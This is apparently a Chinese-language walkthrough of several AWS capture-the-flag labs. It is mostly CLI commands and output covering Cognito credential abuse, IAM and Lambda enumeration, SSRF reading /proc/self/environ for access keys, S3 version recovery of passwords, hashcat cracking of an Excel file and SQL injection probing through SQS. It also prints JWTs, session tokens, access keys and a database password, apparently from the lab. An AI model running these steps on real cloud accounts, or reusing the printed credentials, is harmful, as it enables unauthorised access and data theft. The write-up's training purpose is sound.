        "RefreshToken": "eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAifQ.f-INVK-L2DKat-GJU5sDpQJo2yrhemIvLEu3UgU20dbIDw38HJXUov5NgpAwi5L1uZ9POZTBrGn_rom33fs_5881PfCG4GUuufWE2XAaC606M-o4Fpbc4qKpbeJEwwj-aFpc-KldCEuDC6SsbnmCIxSEn4yYpXaO3_pYiO6sllbXiyALwqdmBVXfwtm-BTG3bd6JlqC96MUjZB_lhKa802_vgIDESxVXqHzu7qPsr4t9xUzPwhWN4uKu8ujRBegDzLJJI64W3E4NjuSEzxmjsuptjVx6vfrzBzJ-KI5icVBgPgTL9KXkgrlGrshLym736DWaxxxvp-vNmpMXGh9ajQ.ePEHpXygHe9tMPpn.vxM6lrudM4B0dpTF3VhwNxLbQvvPjtmk840dO3cFK9dHyjid-mUK9Im9vOSnEkdIP04mOUopJ9Le5FP5yr7iZo4r8U6iIeh1UWqKe0J1PAkoeFw2pxHq9jf1tp8HLfv7CJ9xmgoqr6jhHSdQrivG2vteErHU6D2KKJNeY4QSKS8NPImdDKP612lyS4birmQyYKnIV_GTYgbnlWCCmr7m6YIlnsYNlrVn3mQZ9s0lOmoLn3tSoIaa40RDhSJipLKO5Z4CqZJOGZlDDzkC6uuLZHQjYHjcXC1yGVYHGIuA7v-32XzDa5Ar_r2wxLbIuBaBawdcCdpaBKQn1Fk2I8f52o7dTJrHjLqlTDe6Pgt1tVP-EclnlVGUCkkFNse46YMgE6RknPdN2WA5aPaSIN81rx2QuZ-HuoUrI7d_ndeee07-mqaed6vhiKa5d7lD0vGXQRLkiYdowHoMQfYGi3lYbt6qRuKQoie7qD3UbtBn5meGaZtYULihH7usEjdFN8-qtQQwqWfbi_WpucamIEv557ArSWxzEKKhckg-0PUmBCjUHKRr56gxv131qsJ8MiklYBAQnPlUeVJBTi5YjhVS2_LmoND8ezL5BHFpY4beoXx2Lt8Zvumylj9rjtxsDO4D61RwqXyMqxN02t3PNK8DyBhlUgMifFDmrXNdqwiqOGqXa5y13Sxm3DGjh6v4_ouc53G7we1CyrpSY-Vnw1zqPeeac9SZGB40o34XlWM_revGwi-LQZoGNp1kErWGiYWlnZfSzSdIHycY1mldxLMGybUCbKB_Uuc-mobdM8I77XNdZi27EXmE8P1m2FyBrx60Mv5-i_tZVM7aI42e3bFWzZ7ojclhW33M9O2BVo82TzCIy93jp5aWaPfpxmvI2YumIh4wd1siry-LKME7C0jPnXNiZHcjssKzwH9PgIWGf83JExz5UP0PHrJZqBRor8aRPrzGct9kvgVaXczzmLLz2rWhdk-4VwPNNefTHM6miq8vGK1CH7h-1t9JcrxMMMHXVPX3JmnlGkDDSYVuK2Ae4KZuzIMjhcoKuVD_giLxL0JppWdK2ma7FbzLyAVTxomw9s5tYoiNpN0pfo7l5N4mPCEB6w_0Hrb7OXsZeUYJXdua-XSlHIWff8P_J8MMy2BjVuptImYfSBOEV9KUFHtzaTf8SGs9lzCYU6i49zusDoTCoBHVVZJBPjxYoe9TjwjmRhWqQnOnULiB7P7uNCGgTHkYWSMCDgwfMZq83oFc-glOrhgXn1I5lFY7896Gt7ji-NU.Y4vCaDSkKQ5Ugp8PiM2xpQ",
        "IdToken": "eyJraWQiOiJqTWtSTTVsQnJNUzZxZXFJVWVCRVQyRlhHOUUrZjdwbXVLajM2VlVGMStrPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiI2ZjM5MjFkNy1jNjg0LTQwZTYtOTRhMi1iMWYzMDc3ZWJkMTciLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiaXNzIjoiaHR0cHM6XC9cL2NvZ25pdG8taWRwLnVzLWVhc3QtMS5hbWF6b25hd3MuY29tXC91cy1lYXN0LTFfOHJjSzdhYnR6IiwiY29nbml0bzp1c2VybmFtZSI6ImZlbmcxIiwib3JpZ2luX2p0aSI6IjMyNzU4MzY5LTVkZWEtNGUwZC1iOWEyLTk4NWZlOTg1ZDVjNCIsImF1ZCI6IjE2ZjFnOThiZnVqOWkwZzNmOGJlMzZra3JsIiwiZXZlbnRfaWQiOiIxZjIzZjg2ZC1kYTY0LTQ3YzYtOTQ4ZC1iZTkwNzcxMDZkMjciLCJ0b2tlbl91c2UiOiJpZCIsImF1dGhfdGltZSI6MTY5ODA2NDg2MiwiZXhwIjoxNjk4MDY4NDYyLCJpYXQiOjE2OTgwNjQ4NjIsImp0aSI6ImJlNzVjYTcyLWM5YjktNGEwNS05NjU1LTRjODdmNTlkNzY2MCIsImVtYWlsIjoic3VsaXNoaTE0MTU5MjY1M0BnbWFpbC5jb20ifQ.YNgLg2oLKz-rDBoMJMbU1sjDXzPXaJKvRqm9bnG-I7MLaNgBxH0rtwJLhcWoTGcUtGUirqneDHaTchkgCp5Ob6dn8POPNECUUvoM11u8JYh2iXss_RNbnZSTNd7jDs9zdqarIQQaoU4iur3EcOSWD2d7qMj89-6k_fLCoHuhj05oksZ74iAwnqE_s3o9IrIN0SzXKSYjGlcIeMmurrKEKyieNXHdHNZO9_DqFtGV63vS8WOkCh_uDUlmQTIO6b8vVRLMtx9hm-gfpHqSth55qd3upfgrXkKHyM37gX9UoYrc0-h_3vz7Cg8AF5yVLcc0tsd4QiTtKlNk24a95I6rUw"
    }
}
```

后续与身份池交互要用到IdToken：

[![](assets/1699929822-9aec7186cdb071bc36aed546e535f847.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231109141027-adb3d192-7ec6-1.png)

从jwt可以得到很多信息，其中的iis是后续--logins要用到的`cognito-idp.<region>.amazon-aws.com/<YOUR_USER_POOL_ID>`。

接下来步骤一样的，只不过要拿jwt去重新获取凭证。这次不是匿名获取的凭证，是登录过用户池的身份拿的凭证。

```plain
aws cognito-identity get-id --identity-pool-id us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367 --logins "cognito-idp.us-east-1.amazonaws.com/us-east-1_8rcK7abtz=IdToken" --no-cli-pager
{
    "IdentityId": "us-east-1:3ac15a2c-a3a0-4bec-8474-e224565f45d3"
}


aws cognito-identity get-credentials-for-identity --identity-id us-east-1:06a13cbe-d10c-43f6-bd44-eee7d773c61b --logins "cognito-idp.us-east-1.amazonaws.com/us-east-1_8rcK7abtz=TdToken" --no-cl
i-pager
{
    "IdentityId": "us-east-1:3ac15a2c-a3a0-4bec-8474-e224565f45d3",
    "Credentials": {
        "AccessKeyId": "ASIAWHEOTHRFYWTCJTGR",
        "SecretKey": "07GL5hoiBn+KdN3WRyofRj34gDNX4rkxxNpS0OtZ",
        "SessionToken": "IQoJb3JpZ2luX2VjEAUaCXVzLWVhc3QtMSJHMEUCIQDv2f4v3BiCQJttUWiktJ/1CmYOSAhVcmzzPDJt1ALgeQIgNVOyYuF7Y6IOZGsctVi/xAcu0jhhTtGjdflKV0yZc5sqxAQILhAAGgw0Mjc2NDgzMDIxNTUiDC36uhIMJ8/TfjZZcSqhBBwLMkxEj5isAqXnky+vUZa9MPdKog3YxOy0HhvbTOFUqa5bb9SQKfsfOILWAcYGkts3bxdTZhPEJLzryUZElO0vV3xSF2ns8xrD7syBG4URo9fkUi7+agB+gaaa5sFxFAIhJdCqI9LWndAKMuXUcRt/p2y2bogK/S8CJ9vchCHrXq1wYMtWz5GwZURrVVNlew4cuRRWAeLHXtoduelHWsFEqF7xbnSdRUSj8cWOMYR/2c52o47U9BDiX00JGqz8HRuIUWAHdlXlzadkIMb60pZpZ2Jt91eJ1qkV/vo0etp/1jZ1nzXhHa61ffDfIRhkIdOBYl7lR6QLD7iQkXiQgJT3YUc2UkRi/ZPZ4UIpe7eh+eCjgfBfRlweWkqQ6qNjBaQkp347vcG+scqfqQAOtC4mlHJzrNkU90NSr9uoIK2j5TwRfrbeDYhK49aZ01ZKcwfUUBpV+dy4lqvw32skIFVEfe8t2JHrpsCHGsjXwRiwqqv6RWwoKw2Kjxfm0xjUm4EAq1RAyyLrJ77h6cCSCUlG1ad0xNA4h6jB9PS3HWnJ6ubPI7shOp6loYhYKN7klh8z9KGkKgW3gcWfU0a+OtWU5HZcIldfaXPPyne2rB4LtTh0tSnbockJ31qswowGkDK9laAD8Cb6qAfXeD7j/dr/+Z+Kgr/PjPDOx9Rd+HcpV5yyzQWXrZuwAfGBMij378fGOAB7NqL6oZbdNzVMLCc5MJnb2akGOoUC/G6EvE35u2N/e8b6WoUCyIOAtzAMMgyxvps1S+BLagnhrK4dn0MtfQb6q5nsiUDsRPMbSzbH7wBXdfxFQ3oRN3viglbdzd8vGxiHaoifUbdUeMSt9M/BGwB36oelub2oC1OJ6ib7mtZ3kaJxDShZ1YHfLiF4xo3NniNkPMFu9n9X0r7RN+c2Kr9PoIZ727cfhxedCyozK+P3Bg+2oZfTQCIKlasODeBMn71jHez3d0eB5UsVMXRCrxG5F9+rWoOIf/Kvt377JIcefmB/P2GD/eruV51GJSKiLdlhhyKHI+WO5D8zMbbUTun8WOGr8VFCnRwFWKF3kabUwjqqFXGYqFaTNVj1",
        "Expiration": "2023-10-23T21:56:57+08:00"
    }
}
```

配置好之后看一下身份：

```plain
aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AROAWHEOTHRFZ7HQ7Z6QA:CognitoIdentityCredentials",
    "Account": "427648302155",
    "Arn": "arn:aws:sts::427648302155:assumed-role/Cognito_StatusAppAuth_Role/CognitoIdentityCredentials"
}

aws iam list-role-policies --role-name Cognito_StatusAppAuth_Role --no-cli-pager
{
    "PolicyNames": [
        "oneClick_Cognito_StatusAppAuth_Role_1689349464673"
    ]
}

aws iam get-role-policy --role-name Cognito_StatusAppAuth_Role --policy-name oneClick_Cognito_StatusAppAuth_Role_1689349464673 --no-cli-pager
{
    "RoleName": "Cognito_StatusAppAuth_Role",
    "PolicyName": "oneClick_Cognito_StatusAppAuth_Role_1689349464673",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "VisualEditor0",
                "Effect": "Allow",
                "Action": [
                    "cognito-identity:*",
                    "mobileanalytics:PutEvents",
                    "cognito-sync:*"
                ],
                "Resource": "*"
            },
            {
                "Sid": "VisualEditor1",
                "Effect": "Allow",
                "Action": [
                    "s3:GetObject",
                    "iam:GetPolicyVersion",
                    "iam:GetPolicy",
                    "iam:ListAttachedRolePolicies",
                    "s3:ListBucket",
                    "iam:ListRolePolicies",
                    "iam:GetRolePolicy"
                ],
                "Resource": [
                    "arn:aws:s3:::hl-app-images",
                    "arn:aws:s3:::hl-app-images/*",
                    "arn:aws:iam::427648302155:policy/Status",
                    "arn:aws:iam::427648302155:role/Cognito_StatusAppAuth_Role"
                ]
            }
        ]
    }
}

aws iam list-attached-role-policies --role-name Cognito_StatusAppAuth_Role --no-cli-pager
{
    "AttachedPolicies": [
        {
            "PolicyName": "Status",
            "PolicyArn": "arn:aws:iam::427648302155:policy/Status"
        }
    ]
}

aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/Status --no-cli-pager
{
    "Policy": {
        "PolicyName": "Status",
        "PolicyId": "ANPAWHEOTHRF4PPCP4KUA",
        "Arn": "arn:aws:iam::427648302155:policy/Status",
        "Path": "/",
        "DefaultVersionId": "v4",
        "AttachmentCount": 2,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "CreateDate": "2023-07-13T21:07:44+00:00",
        "UpdateDate": "2023-07-15T09:43:20+00:00",
        "Tags": []
    }
}

aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/Status --version-id v4 --no-cli-pager
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": [
                        "lambda:InvokeFunction",
                        "lambda:GetFunction"
                    ],
                    "Resource": "arn:aws:lambda:us-east-1:427648302155:function:huge-logistics-status"
                },
                {
                    "Sid": "VisualEditor1",
                    "Effect": "Allow",
                    "Action": "lambda:ListFunctions",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2023-07-15T09:43:20+00:00"
    }
}

aws lambda list-functions --no-cli-pager
{
    "Functions": [
        {
            "FunctionName": "huge-logistics-status",
            "FunctionArn": "arn:aws:lambda:us-east-1:427648302155:function:huge-logistics-status",
            "Runtime": "python3.10",
            "Role": "arn:aws:iam::427648302155:role/service-role/huge-logistics-status-role-4m4kg3fv",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 775,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2023-07-17T17:21:11.000+0000",
            "CodeSha256": "78BBjKChkzNIwtlGOiI9paXxi/IYSuzv1GUaXBNuqY0=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "287ac428-dfc2-4911-b003-e765795d1a5d",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            }
        },
        {
            "FunctionName": "SecretsManagermysql-rotation",
            "FunctionArn": "arn:aws:lambda:us-east-1:427648302155:function:SecretsManagermysql-rotation",
            "Runtime": "python3.9",
            "Role": "arn:aws:iam::427648302155:role/SecretsManagerRDSMariaDBR-SecretsManagerRDSMariaDB-128H7L75TCDD5",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 893992,
            "Description": "Rotates a Secrets Manager secret for Amazon RDS MariaDB credentials using the alternating users rotation strategy.",
            "Timeout": 30,
            "MemorySize": 128,
            "LastModified": "2023-07-12T18:48:35.825+0000",
            "CodeSha256": "LbavP2POQ9AcuPXX54bNIhLOPpMF7GYd/qmDa3WcIp0=",
            "Version": "$LATEST",
            "Environment": {
                "Variables": {
                    "EXCLUDE_CHARACTERS": "/@\"'\\",
                    "SECRETS_MANAGER_ENDPOINT": "https://secretsmanager.us-east-1.amazonaws.com"
                }
            },
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "108eb366-f627-488e-81c6-25a07003ecc4",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
{
    "Configuration": {
        "FunctionName": "huge-logistics-status",
        "FunctionArn": "arn:aws:lambda:us-east-1:427648302155:function:huge-logistics-status",
        "Runtime": "python3.10",
        "Role": "arn:aws:iam::427648302155:role/service-role/huge-logistics-status-role-4m4kg3fv",
        "Handler": "lambda_function.lambda_handler",
        "CodeSize": 775,
        "Description": "",
        "Timeout": 3,
        "MemorySize": 128,
        "LastModified": "2023-07-17T17:21:11.000+0000",
        "CodeSha256": "78BBjKChkzNIwtlGOiI9paXxi/IYSuzv1GUaXBNuqY0=",
        "Version": "$LATEST",
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "287ac428-dfc2-4911-b003-e765795d1a5d",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip",
        "Architectures": [
            "x86_64"
        ],
        "EphemeralStorage": {
            "Size": 512
        },
        "SnapStart": {
            "ApplyOn": "None",
            "OptimizationStatus": "Off"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            }
        }
    ]
}
```

只可以调用huge-logistics-status函数，查看一下函数的详情：

```plain
aws lambda get-function --function-name huge-logistics-status
    "Code": {
        "RepositoryType": "S3",
        "Location": "xxx"
    }
```

Location中可以下载代码，下载下来：

```plain
import os
import json
import urllib.request
from datetime import datetime
import boto3
import uuid

def lambda_handler(event, context):
    s3 = boto3.client('s3')
    bucket_name = 'hl-status-log-bucket'

    try:
        target = event.get('target', 'http://huge-logistics.com')

        response = urllib.request.urlopen(target)
        data = response.read()
        return_status = 'Service is available.' if response.getcode() == 200 else 'Service is not available.'
        return {
            'statusCode': response.getcode(),
            'statusMessage': return_status,
            'body': data.decode('utf-8')
        }
    except urllib.error.HTTPError as e:
        return {
            'statusCode': e.code,
            'body': json.dumps({
                'message': 'HTTP error occurred.',
                'details': str(e)
            })
        }
    except Exception as e:
        debug_info = {
            'error_message': str(e),
            'request_time': datetime.utcnow().isoformat(),
            'requested_website': target,
            'event': event,
            'error_id': str(uuid.uuid4()),
        }
        debug_info_json = json.dumps(debug_info)

        # Try to upload to S3
        try:
            s3.put_object(Body=debug_info_json, Bucket=bucket_name, Key=f'debug_info_{context.aws_request_id}.json')
        except Exception as s3_e:
            print(f"Failed to upload debug info to S3: {str(s3_e)}")

        return {
            'statusCode': 500,
            'body': json.dumps({
                'message': 'Unexpected error occurred.',
                'debug_info': debug_info
            })
        }
```

如果给了target就进行请求，也就是ssrf了。lambda的SSRF一个很常见的攻击方式是读环境变量`/proc/self/environ`，里面大概率会有aksk。

```plain
#ssrf
aws lambda invoke --function-name huge-logistics-status --payload 'eyJ0YXJnZXQiOiJodHRwczovL3d3dy5iYWlkdS5jb20ifQ=='  output2.txt
```

从中拿到aksk，配置好之后访问代码中提到的hl-status-log-bucket即可得到flag。

**防御：**

从攻击流程中很明显可以发现两点问题：身份池不应该支持未经身份验证的身份获取凭证，以及用户池不应该支持注册。

## 14.Leverage Leaked Credentials for Pwnage

从.env中可以获取到的信息：

```plain
DB_USERNAME=jose
DB_PASSWORD=DevOps0001!

REACT_APP_AWS_ACCESS_KEY_ID=AKIAWHEOTHRFVXYV44WP
REACT_APP_AWS_SECRET_ACCESS_KEY=
REACT_APP_AWS_DEFAULT_REGION=us-east-1
REACT_APP_AWS_BUCKET=react-dev-aws
REACT_APP_AWS_USE_PATH_STYLE_ENDPOINT=false
```

知道了一对用户名和密码以及AK，但是没有sk。

尝试获取到ak对应的account id，尝试用这对用户名密码进行aws console的登录，因为用户名密码很可能重复使用

```plain
aws sts get-access-key-info --access-key-id AKIAWHEOTHRFVXYV44WP
```

aws console登录后查看secretmanager：

[![](assets/1699929822-5540742216f0542097c50c446aa26902.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231109141157-e31aecee-7ec6-1.png)

可以访问employee-database：

```plain
{"username": "reports", "password": "fw=T(HWf5;{d`U.PK)19*lC_qhkJ}iD=", "engine": "mariadb", "host": "employees.cwqkzlyzmm5z.us-east-1.rds.amazonaws.com", "port": 3306, "masterarn": "arn:aws:secretsmanager:us-east-1:427648302155:secret:employee-database-admin-Bs8G8Z", "dbInstanceIdentifier": "employees"}
```

登上mysql就可以拿到flag，里面也有雇员的私人信息：

```plain
mysql -u reports -p -h employees.cwqkzlyzmm5z.us-east-1.rds.amazonaws.com
```

[![](assets/1699929822-e383c73b51faa8dd8ebbc74579ba2d71.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231109141227-f50513ee-7ec6-1.png)

也可以用truffleHog工具

```plain
truffleHog --regex --entropy=False ./aws-react-app
```

## 15.Access Secrets with S3 Bucket Versioning

学习了一下s3的versions。

在存储桶中可以查看到有意思的auth.js，但是没有关键的内容。

看一下head：

```plain
curl -I https://huge-logistics-dashboard.s3.eu-north-1.amazonaws.com/static/js/auth.js
HTTP/1.1 200 OK
x-amz-id-2: AX3q4TbiAEc8XfaNgjGUIbxK3XWB6Zc6fY7ldYO9hL2HUv2byFd/Q2HpUj9mwYUOHhJWnT8ZLfE=
x-amz-request-id: W1F7KZ9VZGQACXNX
Date: Tue, 24 Oct 2023 07:01:49 GMT
Last-Modified: Sat, 12 Aug 2023 20:43:43 GMT
ETag: "c3d04472943ae3d20730c1b81a3194d2"
x-amz-server-side-encryption: AES256
x-amz-version-id: j2hElDSlveHRMaivuWldk8KSrC.vIONW
Accept-Ranges: bytes
Content-Type: application/javascript
Server: AmazonS3
Content-Length: 244
```

发现了x-amz-version-id，这说明这个s3启用了版本控制。

Amazon S3 版本控制是一项可以在 S3 存储桶上启用的功能，以将对象的多个版本（包括所有写入和删除）保留在同一存储桶中。一旦为存储桶启用了版本控制，就无法暂停它，只能永久禁用（并且此时已进行版本控制的对象将保持其版本）。

```plain
#没有成功
aws s3api get-bucket-versioning --bucket huge-logistics-dashboard --region eu-north-1 --no-sign-request --no-cli-pager

#列一下所有object的版本信息，发现了两个有意思的文件
aws s3api list-object-versions --bucket huge-logistics-dashboard --region eu-north-1 --no-sign-request  --no-cli-pager

        {
            "ETag": "\"24f3e7a035c28ef1f75d63a93b980770\"",
            "Size": 24119,
            "StorageClass": "STANDARD",
            "Key": "private/Business Health - Board Meeting (Confidential).xlsx",
            "VersionId": "HPnPmnGr_j6Prhg2K9X2Y.OcXxlO1xm8",
            "IsLatest": false,
            "LastModified": "2023-08-16T19:11:03+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
        {
            "ETag": "\"7b63218cfe1da7f845bfc7ba96c2169f\"",
            "Size": 463,
            "StorageClass": "STANDARD",
            "Key": "static/js/auth.js",
            "VersionId": "qgWpDiIwY05TGdUvTnGJSH49frH_7.yh",
            "IsLatest": false,
            "LastModified": "2023-08-12T19:13:25+00:00",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },

#查看auth.js的特定版本
aws s3api get-object --bucket huge-logistics-dashboard --region eu-north-1 --key static/js/auth.js --version-id qgWpDiIwY05TGdUvTnGJSH49frH_7.yh auth.js --no-sign-request
```

在里面发现了邮箱和密码。登录进去之后在profile发现了aksk：

[![](assets/1699929822-715f14ea6d5b59823ba8b3aab33091db.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231109141300-08eab0bc-7ec7-1.png)

配置好之后查看一下信息，然后读取private下的旧版本的xlsx：

```plain
aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AIDATWVWNKAVEJCVKW2CS",
    "Account": "254859366442",
    "Arn": "arn:aws:iam::254859366442:user/data-user"
}

aws s3api get-object --bucket huge-logistics-dashboard --region eu-north-1 --key "private/Business Health - Board Meeting (Confidential).xlsx" --version-id HPnPmnGr_j6Prhg2K9X2Y.OcXxlO1xm8 1.xlsx
```

从中可以读取到flag。

## 16.Secure S3 with Amazon Macie

主要讲了怎么用Amazon Macie。

Amazon Macie 是一项数据安全服务，该服务使用机器学习和模式匹配来发现敏感数据，提供对数据安全风险的可见性，并实现针对这些风险的自动防护。

为了帮助您管理组织的 Amazon Simple Storage Service (Amazon S3) 数据资产的安全状况，Macie 为您提供了 S3 存储桶清单，并自动评估和监控存储桶的安全性和访问控制。如果 Macie 检测到潜在的数据安全性或隐私问题（例如桶变为可供公共访问），Macie 会生成调查发现，供您查看并在必要时进行补救。

Macie 还自动发现和报告敏感数据，让您更好地了解您的组织在 Amazon S3 中存储的数据。要检测敏感数据，您可以使用 Macie 提供的内置标准和技术、您定义的自定义标准或两者的组合。如果 Macie 在 S3 对象中检测到敏感数据，Macie 会生成一个查找结果，通知您 Macie 发现的敏感数据。

除调查结果外，Macie 还提供统计数据和其他数据，以便深入了解您的 Amazon S3 数据的安全状况以及敏感数据可能存在于您的数据资产中的位置。统计数据和数据可以指导您做出决定，对特定 S3 存储桶和对象进行更深入的调查。您可以使用 Amazon Macie 控制台或 Amazon Macie API 查看和分析调查结果、统计数据和其他数据。你也可以利用 Macie 与亚马逊的整合EventBridge和AWS Security Hub通过使用其他服务、应用程序和系统监控、处理和修复调查结果。

[![](assets/1699929822-74a519cfa5e7e449d0b561d04c673095.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231109141339-1ffde9f4-7ec7-1.png)

以及命令行的操作。

## 17.Exploit Weak Bucket Policies for Privileged Access

```plain
aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AIDA3NRSK2PTKPMJEJQ7H",
    "Account": "785010840550",
    "Arn": "arn:aws:iam::785010840550:user/test"
}
#查看存储桶的的policy，允许访问backup.xlsx
aws s3api get-bucket-policy --bucket hugelogistics-data --no-cli-pager --output text|python -m json.tool
{
    "Statement": [
        {
            "Action": [
                "s3:GetObject",
                "s3:GetObjectAcl"
            ],
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Resource": [
                "arn:aws:s3:::hugelogistics-data/backup.xlsx",
                "arn:aws:s3:::hugelogistics-data/background.png"
            ],
            "Sid": "PublicReadForAuthenticatedUsersForObject"
        },
        {
            "Action": "s3:GetBucketPolicy",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Resource": "arn:aws:s3:::hugelogistics-data",
            "Sid": "AllowGetBucketPolicy"
        }
    ],
    "Version": "2012-10-17"
}

aws s3api get-object --bucket hugelogistics-data  --key backup.xlsx backup.xlsx
```

把`backup.xlsx`下载下来后，发现要密码，学一下excel密码的破解：

```plain
#得到密码的hash
python3.10 office2john.py ~/github/CTF/AWS/pwnedlabs/challenge18/backup.xlsx >hash.txt
#破解，不同版本的 Microsoft Office 使用不同的加密方法。Office 2007 采用基于 SHA-1 和 AES-128 的加密，而 Office 2010 则升级到使用 AES-128 或 AES-256 的 SHA-512。Office 2013 和更新版本通过默认使用 AES-256 的 SHA-512、在加密过程中添加随机盐以及增加 SHA-512 迭代次数，进一步增强了安全性。这使得在较新版本的 Office 中破解加密密码的计算成本更高且速度更慢。
hashcat  hash.txt /Users/feng/many-ctf/rockyou.txt --force --username

#得到密码summertime
```

打开之后是一堆用户名密码但是都不对，继续扫目录发现了/crm，利用crm系统的用户名密码登录成功后，把发票下来下载得到flag。

## 18.SQS and Lambda SQL Injection

```plain
aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AIDATWVWNKAVC74CPGHYZ",
    "Account": "254859366442",
    "Arn": "arn:aws:iam::254859366442:user/analytics-usr"
}

aws sqs list-queues --no-cli-pager
{
    "QueueUrls": [
        "https://sqs.eu-north-1.amazonaws.com/254859366442/huge-analytics"
    ]
}

aws lambda list-functions --no-cli-pager
{
    "Functions": [
        {
            "FunctionName": "huge-logistics-stock",
            "FunctionArn": "arn:aws:lambda:eu-north-1:254859366442:function:huge-logistics-stock",
            "Runtime": "python3.11",
            "Role": "arn:aws:iam::254859366442:role/service-role/huge-lambda-analytics-role-ewljs6ls",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 104874,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2023-09-20T11:26:12.000+0000",
            "CodeSha256": "FkcaVsjbU9YqnNKIPWBqAu76S9bST/bfljnSuDoU4Y0=",
            "Version": "$LATEST",
            "VpcConfig": {
                "SubnetIds": [],
                "SecurityGroupIds": [],
                "VpcId": ""
            },
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "dcbd95eb-b673-40dc-9bc0-2ce35d1edd0c",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            }
        }
    ]
}

aws sqs receive-message --queue-url https://sqs.eu-north-1.amazonaws.com/254859366442/huge-analytics --message-attribute-names All --no-cli-pager
{
    "Messages": [
        {
            "MessageId": "9edf75bc-2bbd-4213-a89f-01a6c1a92619",
            "ReceiptHandle": "AQEBipUBYwdr7DtfzMznQKH99L92iU5uQNM6WY8WeXbBNEwwPVt3zyEqUMmxLFscWU/usOQQCYPHpHYrgcWWBzA7NiyQMQUGo/g3N3ozFqFhG4buqSZwbBcOEuVnJlgTirEJg80at0pAXZ5IiwEjjHluYGnOlUWeWMrc+uUbn/nCLClZVVeLixXa4ttOiYfFygPo1izbP7VZ+Zd3DIItIePfQqbBjBXYodYH+xxBCVDd92zr83Ia7QkxZFyuR+Lvm457ID9GGPSJqoXSVIl/+B9HOMdKBw31teMATKIS7IgsEawd+iFQFaE5z2t1mBHz8ZlTXg2MqxScbLgi57GxjDzFw06ncs6/teT1ZoSDsEOpzYI7zGMv9tPLofJgfj2XXElwlkZJY7LEMG+ZHUTs6iNxIQ==",
            "MD5OfBody": "2e3745c659cd0aa68643411804faac55",
            "Body": "Adidas shipped package of 110kg"
        }
    ]
}

aws lambda list-functions --no-cli-pager
{
    "Functions": [
        {
            "FunctionName": "huge-logistics-stock",
            "FunctionArn": "arn:aws:lambda:eu-north-1:254859366442:function:huge-logistics-stock",
            "Runtime": "python3.11",
            "Role": "arn:aws:iam::254859366442:role/service-role/huge-lambda-analytics-role-ewljs6ls",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 104874,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2023-09-20T11:26:12.000+0000",
            "CodeSha256": "FkcaVsjbU9YqnNKIPWBqAu76S9bST/bfljnSuDoU4Y0=",
            "Version": "$LATEST",
            "VpcConfig": {
                "SubnetIds": [],
                "SecurityGroupIds": [],
                "VpcId": ""
            },
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "dcbd95eb-b673-40dc-9bc0-2ce35d1edd0c",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            }
        }
    ]
}
```

调用函数的时候需要参数，然后爆破参数发现是DESC。

接下来就是奇怪的尝试，我觉得很难联想到，尝试发消息：

```plain
aws sqs send-message --queue-url https://sqs.eu-north-1.amazonaws.com/254859366442/huge-analytics --message-attributes '{ "Weight": { "StringValue": "1337", "DataType":"Number"}, "Client": {"StringValue":"EY", "DataType": "String"}, "trackingID": {"StringValue":"HLT1337", "DataType":"String"}}' --message-body "feng"
#然后调用
aws lambda invoke --function-name huge-logistics-stock --payload 'eyJERVNDIjoiSExUMTMzNyJ9' output
```

发现可以成功查询到HLT1337的相关信息。

然后就是开始测试，最后发现注入点在Client。

```plain
